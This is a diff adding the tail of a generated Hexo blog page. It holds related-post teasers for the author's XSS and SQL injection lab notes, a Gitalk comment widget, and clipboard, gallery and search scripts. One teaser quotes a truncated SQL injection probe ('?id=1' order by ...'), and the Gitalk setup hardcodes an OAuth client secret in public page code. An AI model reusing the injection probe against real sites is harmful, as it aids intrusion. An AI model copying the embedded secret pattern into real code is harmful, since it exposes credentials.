+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/16/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-XSS/" title="Web漏洞整理-XSS">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln2.jpg" alt="Web漏洞整理-XSS"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
+								SQL与sqlmap			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 13日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQL与sqlmapSQL语法order by
+
+对查询结果排序
+ASC：升序（默认）、DESC：降序
+SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
+如XXX/?id=1&#39; order ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">
+								sqli-labs Adv Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 18日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Adv Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali|10.10.10.1靶机：ubuntu|10.10.10.2|Apache+PHP+MySQL
+L...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/18/sqli-labs-Adv-Injections/" title="sqli-labs Adv Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Adv Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
